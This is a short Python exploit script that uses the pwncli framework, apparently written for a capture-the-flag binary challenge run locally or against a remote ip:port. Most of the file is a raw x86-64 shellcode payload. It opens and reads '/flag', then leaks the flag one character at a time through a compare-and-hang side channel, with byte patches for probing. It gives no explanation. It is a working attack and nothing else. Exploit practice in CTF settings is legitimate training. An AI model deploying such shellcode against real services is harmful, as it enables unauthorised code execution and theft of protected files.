#!/usr/bin/env python3
# Date: 2025-07-04 22:39:31
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)
rl()
code = b'H\xc7\xc0\x02\x00\x00\x00H\xc7\xc7\xa0A@\x00H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00\x0f\x05H\xc7\xc0\x00\x00\x00\x00H\xc7\xc7\x03\x00\x00\x00H\xc7\xc6\x00H@\x00H\xc7\xc2d\x00\x00\x00\x0f\x05H\x83\xc6!\x8a\x06<At\x01\xc3\xeb\xfe'
code += b'\x00'*183
code += b'/flag'
code = bytearray(code)
code[63]=0
code[67]=ord('f')
s(code)

ia()
